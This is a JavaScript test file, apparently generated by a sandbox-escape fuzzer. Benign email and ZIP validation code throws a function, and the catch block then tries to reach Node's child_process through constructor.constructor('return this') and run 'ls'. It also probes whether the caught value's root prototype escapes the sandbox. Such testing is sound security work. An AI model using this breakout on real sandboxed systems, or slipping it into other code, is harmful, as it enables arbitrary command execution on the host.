try {
    letters = new Array('a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z');
    numbers = new Array(1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26);
    colors = new Array('FF', 'CC', '99', '66', '33', '00');
    var endResult;
    function doTest() {
        let REPLACER = 23;
        endResult = '';
        for (var k = 0; k < 4000; k++) {
            username = makeName(6);
            k % 2 ? email = username + '@mac.com' : email = username + '(at)mac.com';
            var pattern = /^[a-zA-Z0-9\-\._]+@[a-zA-Z0-9\-_]+(\.?[a-zA-Z0-9\-_]*)\.[a-zA-Z]{2,3}$/;
            if (pattern.test(email)) {
                var r = email + ' appears to be a valid email address.';
                addResult(r);
            } else {
                r = email + ' does NOT appear to be a valid email address.';
                addResult(r);
            }
        }
        for (var s = 0; s < 4000; s++) {
            var zipGood = true;
            var zip = makeNumber(4);
            s % 2 ? zip = zip + 'xyz' : zip = zip.concat('7');
            for (var i = 0; i < zip.length; i++) {
                var ch = zip.charAt(i);
                if (ch < '0' || ch > '9') {
                    zipGood = false;
                    r = zip + ' contains letters.';
                    addResult(r);
                }
            }
            if (zipGood && zip.length > 5) {
                zipGood = false;
                r = zip + ' is longer than five characters.';
                addResult(r);
            }
            if (zipGood) {
                r = zip + ' appears to be a valid ZIP code.';
                addResult(r);
            }
        }
    }
    function makeName(n) {
        let REPLACER = 23;
        var tmp = '';
        for (var i = 0; i < n; i++) {
            var l = Math.floor(26 * Math.random());
            tmp += letters[l];
        }
        return tmp;
    }
    function makeNumber(n) {
        let REPLACER = 23;
        var tmp = '';
        for (var i = 0; i < n; i++) {
            var l = Math.floor(9 * Math.random());
            tmp = tmp.concat(l);
        }
        return tmp;
    }
    function addResult(r) {
        throw () => {
            return () => {
            };
        };
        endResult += '\n' + r;
    }
    doTest();
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}